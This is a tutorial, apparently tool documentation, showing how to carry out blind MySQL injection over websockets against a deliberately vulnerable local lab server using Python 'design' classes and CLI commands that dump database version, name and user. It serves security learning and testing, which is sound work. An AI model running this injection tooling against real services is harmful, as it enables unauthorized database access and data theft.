# Attacking websockets


DBMS | Type | Tags
-|-|-
MySQL | Blind | custom design, websockets

Websockets have become more and more current in the modern web, and using legacy applications to attack them can be tedious. With **ending**, since you use *python* code to define how to interact with your target, it is very easy to inject on custom protocols. This tutorial demonstrates how you can perform a blind SQL injection over websockets, first using a stupid (and yet working) implementation, and then a cleaner, faster one.

## Target setup

We attack [nodejs-websocket-sqli](https://github.com/rayhan0x01/nodejs-websocket-sqli), a vulnerable web server in node. To set it up, use:

```bash
$ git clone https://github.com/rayhan0x01/nodejs-websocket-sqli
$ cd nodejs-websocket-sqli
$ docker compose up
```

The server can then be reached at [http://localhost:8156/](http://localhost:8156/).

## Injection

While the injection is trivial to demonstrate (try `1 AND 1=1` and `1 AND 1=0`), it must be performed over **websockets**. In essence, every time you input something in the search bar, a websocket packet of the form `{"employeeID":"<something>"}` gets sent, and the response looks like: `{"message": "<span class=lime>Employee exists.</span>"}` or `{"message": "<span class=red>Employee not found.</span>"}`.

Let's implement this behaviour using the [`websockets` python library](https://websockets.readthedocs.io/en/stable/), which supports `asyncio`.

## Fast implementation

We first create a design:

```bash
$ ending rayan-node-websocket create
```

Now, if we don't think about performance too much, we can create a new websocket session every time we want to send a payload, get the response, and then close the session. This can be implemented like so:

```python
...

import json
from websockets.asyncio.client import connect
from ending.cli.design import Design as BaseDesign


class Design(BaseDesign):
    async def send(self, payload: str) -> bytes:
        # Create the JSON message: {"employeeID":"<something>"}
        payload = json.dumps({"employeeID": payload})

        # Connect to the websocket
        async with connect("ws://localhost:8156/ws") as websocket:
            # Send the payload
            await websocket.send(payload)
            # Get the response
            message = await websocket.recv()
            # Return the whole response as bytes
            return message.encode()
```

The design can then be configured automatically by **ending**:

```bash
$ ending rayan-node-websocket configure
```

As the configuration succeeds, the design can now be used to perform queries.

```bash
$ ending rayan-node-websocket query -f 'version()' 'database()' 'user()'
```

Although this implementation works, it is not the cleanest: creating a new websocket session involves sending HTTP requests every time, which conflicts with the intended use of websockets.


## Improving the implementation

### Creating a single session

We can improve this by creating a websocket session once, and then use it to send our messages. To do so, we can use the `Design.setup()` method, which gets called before any injection is performed.

```python
class Design(BaseDesign):
    async def setup(self):
        self.websocket = await connect("ws://localhost:8156/ws")
        self.lock = Semaphore(1)
        return await super().setup()
```

We can now use the same websocket session in our `send()` method:

```python
    async def send(self, payload: str="1") -> bytes:
        """Sends given payload 
        to the target and returns the response as bytes.
        """
        async with self.lock:
            payload = json.dumps({"employeeID": payload})
            await self.websocket.send(payload)
            message = await self.websocket.recv()
            return message.encode()
```


!!! note

    We use a lock to prevent the design from waiting for several websockets messages at the same time,
    because the `websockets` library does not allow it.

The implementation is now way faster. But it can be improved a little bit more.

### A pool of sessions

In the first implementation, we created as *many* sessions, whereas in the second one we only had a *single* session. The best implementation lies in between: we can create a pool of several sessions, and use them alternatively.

To do so, we'll create a `WebSocketPool` class that contains several websockets and which returns them at will.

```python
import asyncio

from websockets.asyncio.client import connect
from asyncio import Queue


class WebSocketPool:
    """A pool of websockets.
    
    Usage:

        ws_pool = WebSocketPool(10)

        async with ws_pool.get() as websocket:
            await websocket.send(payload)
            await websocket.recv()
            ...

    """
    nb: int
    """Number of available websockets."""
    __pool: Queue
    """Queue that holds the websockets"""
    
    def __init__(self, nb: int):
        self.nb = nb
        self.__pool = None

    async def initialize(self):
        """Initializes the pool."""
        websockets = await asyncio.gather(*(
            connect("ws://localhost:8156/ws") for _ in range(self.nb)
        ))
        self.__pool = Queue()
        for websocket in websockets:
            self.__pool.put_nowait(websocket)
    
    @asynccontextmanager
    async def get(self):
        """Returns a websocket."""

        # Return a websocket from the queue (pool)...
        ws = await self.__pool.get()
        
        try:
            yield ws
        finally:
            # ... and put it back in when we're done
            await self.__pool.put(ws)
```

We can then use it in our design using `WebSocketPool.get()`:

```python
class Design(BaseDesign):
    async def setup(self):
        self.websockets = WebSocketPool(5)
        await self.websockets.initialize()
        return await super().setup()

    async def send(self, payload: str="1") -> bytes:
        """Sends given payload to the target and returns the response as bytes.
        """
        async with self.websockets.get() as websocket:
            payload = json.dumps({"employeeID": payload})
            await websocket.send(payload)
            message = await websocket.recv()
            return message.encode()
```

And we're done! With a few lines of code, we have a **concurrent, efficient websocket SQL injection**.
